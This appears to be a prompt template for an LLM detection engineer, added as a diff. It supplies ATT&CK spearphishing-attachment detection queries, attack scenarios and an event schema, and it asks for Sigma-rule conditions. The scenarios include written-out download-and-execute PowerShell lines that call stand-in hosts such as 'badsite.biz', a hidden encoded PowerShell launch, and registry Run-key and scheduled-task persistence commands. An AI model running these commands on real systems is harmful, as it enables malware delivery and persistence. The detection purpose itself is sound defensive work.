@@ -1,0 +1,249 @@
+C — Context
+You are a senior detection engineer tasked with translating conceptual attack scenarios into concrete detection logic. You will be provided with:
+A list of common detection techniques for this TTP {"Monitor for third-party application logging, messaging, and/or other artifacts that may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[275][276]Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Monitor for suspicious descendant process spawning from Microsoft Office and other productivity software.[277]Analytic 1 - Detecting Phishing Emails with Malicious Attachments(source=\"o365_audit\" OR source=\"gmail_logs\" OR source=\"email_gateway\")| where (spf=\"fail\" OR dkim=\"fail\" OR dmarc=\"fail\")| where (attachment IN (\"docm\", \"exe\", \"vbs\", \"js\", \"zip\"))| where (subject=\"invoice\" OR subject=\"urgent action required\" OR subject=\"account security update\")| eval risk_score=case(    spf=\"fail\" AND dkim=\"fail\", 9,    attachment IN (\"exe\", \"js\", \"vbs\"), 8,    subject IN (\"invoice\", \"security update\"), 7)| where risk_score >= 7| stats count by _time, sender, recipient, subject, risk_score",
+      "Monitor for newly constructed files from a spearphishing emails with a malicious attachment in an attempt to gain access to victim systems.Analytic 1 - Detecting Malicious Email Attachments Creating Files(EventCode=11 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_type IN (\"exe\", \"vbs\", \"js\", \"docm\", \"lnk\"))| where (process_path=\"C:\\Users\\\\Downloads\\\" OR process_path=\"/home//Downloads/\")| eval risk_score=case(    like(file_name, \"%.exe\"), 8,    like(file_name, \"%.js\"), 9,    like(file_name, \"%.vbs\"), 7)| where risk_score >= 7| stats count by _time, host, user, file_name, process_path, risk_score",
+      "Monitor for clicks on phishing links leading to credential harvesting, traffic to newly registered or suspicious domains, hidden redirect chains embedded in phishing emails, or downloads of secondary payloads from phishing domains.Analytic 1 - Detecting Phishing URL Clicks(EventCode=3)OR (source=\"zeek_http_logs\" uri IN (malicious_url_list))OR (source=\"proxy_logs\" url IN (malicious_url_list))| eval risk_score=case(    domain IN (\"bit.ly\", \"tinyurl.com\"), 8,    domain IN (\".xyz\", \".top\"), 7,    uri IN (malicious_url_list), 9)| where risk_score >= 7| stats count by _time, host, user, uri, domain, risk_score",
+      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
+    } 
+A set of **validated and refined** suspicious behavior patterns and attack scenarios {---
+
+**Pattern Name:** Suspicious Attachment Type or Naming
+
+**Scenario Overview:**
+An adversary sends a spearphishing email with a malicious attachment (e.g., Office document, password-protected ZIP containing executable, or ISO containing LNK file). The recipient receives and interacts with the email, potentially extracting and opening the attachment, triggering subsequent stages.
+
+**Attack Flow Breakdown:**
+
+```shell
+# Stage 1: Email delivery to user's inbox with suspicious attachment
+# (No shell command — mail server delivers to client; log artifact: inbound message with attachment)
+# Example artifact: attachment="report_Q2.docm" or "invoice.pdf.exe"
+
+# Stage 2: User opens the email using Outlook
+start "" "C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"
+
+# Stage 3: User saves/extracts the attachment to Downloads or Temp
+copy "C:\Users\<user>\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\<random>\report_Q2.docm" "C:\Users\<user>\Downloads\report_Q2.docm"
+# (ZIP example: extract ZIP file; artifact: "C:\Users\<user>\Downloads\archive.zip")
+
+# Stage 4: User opens extracted file (double-clicks, invokes file via shell)
+start "" "C:\Users\<user>\Downloads\report_Q2.docm"
+# or for an executable masquerading as a document
+start "" "C:\Users\<user>\Downloads\invoice.pdf.exe"
+
+# Stage 5: Initial file execution leads to further malicious activity (see next patterns)
+```
+
+---
+
+**Pattern Name:** Targeted Social Engineering & Email Crafting
+
+**Scenario Overview:**
+An attacker crafts a personalized spearphishing email, using a spoofed sender and social engineering lures. The email urges the user to bypass security controls (e.g., provides a ZIP password, instructs to enable macros), facilitating the attack chain.
+
+**Attack Flow Breakdown:**
+
+```shell
+# Stage 1: Attacker sends spearphishing email with convincing content
+# (Artifact: Message subject = "Urgent: Updated Invoice", From = "accounts@trusted-corp.com", Body contains ZIP password)
+
+# Stage 2: User opens email in Outlook/Thunderbird/Webmail (browser)
+start "" "C:\Program Files\Mozilla Thunderbird\thunderbird.exe"
+# or
+start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" "https://mail.example.com"
+
+# Stage 3: User follows instructions in the email (e.g., uses password to open ZIP)
+# (ZIP extraction: artifact — password-protected ZIP, extracted to user Downloads)
+
+# Stage 4: User opens attachment as per previous pattern
+start "" "C:\Users\<user>\Downloads\invoice.xlsm"
+```
+
+---
+
+**Pattern Name:** User-Initiated Attachment Execution
+
+**Scenario Overview:**
+The user interacts with a malicious attachment, launching it via email client or browser. The opened file may directly execute, or trigger further scripts or applications (e.g., embedded LNK, HTA, or executable).
+
+**Attack Flow Breakdown:**
+
+```shell
+# Stage 1: User double-clicks attachment from email client, invoking the registered handler
+start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "C:\Users\<user>\Downloads\alert.docm"
+# or
+start "" "C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe" "C:\Users\<user>\Downloads\document.pdf"
+
+# Stage 2: If archive, user extracts and opens embedded LNK/CHM/HTA/exe
+start "" "C:\Users\<user>\Downloads\payload.lnk"
+# (Explorer.exe or cmd.exe used as parent)
+```
+
+---
+
+**Pattern Name:** Macro or Script Activation on Document Open
+
+**Scenario Overview:**
+A macro-enabled Office document or similar file type, when opened, prompts the user to enable content. Once enabled, a malicious macro or embedded script executes, often spawning a script interpreter or direct payload.
+
+**Attack Flow Breakdown:**
+
+```shell
+# Stage 1: User opens macro-enabled document
+start "" "C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "C:\Users\<user>\Downloads\budget.xlsm"
+
+# Stage 2: Document prompts "Enable Content"; user enables macros
+# (No shell, but log: registry or process event - macro enabled)
+
+# Stage 3: Macro launches PowerShell or other scripting interpreter
+powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <base64>
+
+# Stage 4: PowerShell downloads and executes payload or runs further commands
+Invoke-WebRequest -Uri "http://malicious-domain.com/payload.exe" -OutFile "C:\Users\<user>\AppData\Local\Temp\payload.exe"
+start "" "C:\Users\<user>\AppData\Local\Temp\payload.exe"
+```
+
+---
+
+**Pattern Name:** File/Extension Masquerading
+
+**Scenario Overview:**
+The malicious file is disguised to appear as a benign document via double extension, icon spoofing, or misleading name, tricking the user into executing malware.
+
+**Attack Flow Breakdown:**
+
+```shell
+# Stage 1: User receives an attachment with double extension (e.g., "details.pdf.exe")
+# (Artifact: file extension and icon do not match; Windows hides known extensions by default)
+
+# Stage 2: User opens file, triggering malware execution
+start "" "C:\Users\<user>\Downloads\details.pdf.exe"
+# (Parent: Outlook.exe, Chrome.exe, or Explorer.exe)
+```
+
+---
+
+**Pattern Name:** Office/Scripting App Spawns Child Process
+
+**Scenario Overview:**
+After a malicious document is opened (with or without macro activation), the Office application spawns a child process such as PowerShell, cmd, or wscript, commonly used to download, execute, or stage further payloads.
+
+**Attack Flow Breakdown:**
+
+```shell
+# Stage 1: User opens malicious Office document
+start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "C:\Users\<user>\Downloads\doc.docm"
+
+# Stage 2: Macro or embedded OLE triggers scripting interpreter
+# (Process: WINWORD.EXE -> powershell.exe)
+powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://badsite.biz/mal.ps1')"
+
+# Stage 3: Child process spawns further binary or connects outbound
+start "" "C:\Users\<user>\AppData\Local\Temp\mal.exe"
+```
+
+---
+
+**Pattern Name:** Malware Drop and C2 Initiation
+
+**Scenario Overview:**
+Payload downloaded or written to disk is executed, often as a new process. Malware may initiate outbound network connections for command-and-control (C2) or data exfiltration.
+
+**Attack Flow Breakdown:**
+
+```shell
+# Stage 1: Payload is written to disk by script or macro
+powershell.exe -c "Invoke-WebRequest -Uri 'http://malicious.site/payload.exe' -OutFile 'C:\Users\<user>\AppData\Local\Temp\payload.exe'"
+
+# Stage 2: Payload executed
+start "" "C:\Users\<user>\AppData\Local\Temp\payload.exe"
+
+# Stage 3: Malware initiates outbound network connection to C2 server
+# (Network log: connection from payload.exe to 203.0.113.10:443)
+# (Process tree: powershell.exe -> payload.exe [network activity])
+```
+
+---
+
+**Pattern Name:** Persistence or System Modification on Initial Access
+
+**Scenario Overview:**
+On successful execution, the initial payload establishes persistence by modifying registry, scheduled tasks, or dropping autorun artifacts, ensuring execution on reboot or user login.
+
+**Attack Flow Breakdown:**
+
+```shell
+# Stage 1: Malware modifies registry to create Run key for persistence
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\<user>\AppData\Roaming\updater.exe" /f
+
+# Stage 2: Malware creates scheduled task to launch at logon
+schtasks.exe /create /tn "OfficeUpdate" /tr "C:\Users\<user>\AppData\Roaming\officeupdate.exe" /sc onlogon /rl HIGHEST /f
+
+# Stage 3: Additional payloads or tools may be dropped to disk for lateral movement or further compromise
+```
+
+
+}.
+A proprietary event schema, defined in detail as follows:
+{
+  "srcNode": {
+    "UUID": "...",             // Unique identifier (optional)
+    "Name": "...",             // Source entity name (optional)
+    "Image": "...",            // Full path of the source binary
+    "Cmdline": "...",          // Full command line used
+    "Type": "Process",         // Always "Process" for srcNode
+    "Pid": 1234                // Process ID (optional)
+  },
+  "dstNode": {
+    "UUID": "...",             // Unique identifier (optional)
+    "Name": "...",             // Name or path of the destination entity
+    "Key": "...",              // Registry key (if Registry)
+    "Image": "...",            // Executable path (if Process)
+    "Cmdline": "...",          // Command line (if Process)
+    "Dstaddress": "...",       // IP address (if Network)
+    "Port": 443,               // Port (if Network)
+    "Type": "Process" | "File" | "Registry" | "Network" | null
+  },
+  "relation": "Process Create", // Action from srcNode to dstNode
+  "timestamp": 1710000000,      // UNIX timestamp
+}
+relation Values by Category:
+Process:"Process Start", "Process Create"
+File:"CloseFile", "CreateFile", "WriteFile", "ReadFile", "QueryAllInformationFile", "QueryBasicInformationFile", "QueryDirectory", "SetBasicInformationFile", "SetDispositionInformationFile"
+Registry:"RegOpenKey", "RegQueryValue", "RegSetValue", "RegCreateKey", "RegDeleteValue", "RegCloseKey", "RegQueryKey"
+Network:"TCP Connect", "TCP Send", "TCP Receive", "TCP Disconnect"
+Example Event :
+{
+  "srcNode": {
+    "Image": "C:\\Windows\\system32\\svchost.exe",
+    "Cmdline": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
+    "Type": "Process"
+  },
+  "dstNode": {
+    "Image": "C:\\Windows\\system32\\backgroundTaskHost.exe",
+    "Cmdline": "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:...",
+    "Type": "Process"
+  },
+  "relation": "Process Create",
+  "timestamp": 1710000000,
+  "label": "T1059"
+}
+
+O — Objective  
+For each provided attack scenario, define a set of precise detection conditions by mapping the scenario's components directly to the detailed event schema provided above. The output must serve as a clear and unambiguous blueprint for writing the final Sigma rule, specifying exactly which fields and values to target.
+
+S — Style  
+• Actionable, step-by-step guidance  
+• Use clear imperative verbs (e.g., “Identify,” “Map,” “Validate”)  
+• Organize as a numbered list for easy reference  
+
+T — Tone  
+Authoritative and precise—providing clear direction without ambiguity.  
+
+A — Audience  
+Sigma-rule authors and cybersecurity detection engineers tasked with translating behaviors and detection methods into log-based rules.  
+
+R — Response Format  
+A numbered list of special instructions, each containing:  
+1. **Title** (short description of the instruction)  
+2. **Details** (what to do, referencing schema fields, behaviors, or detection techniques)  
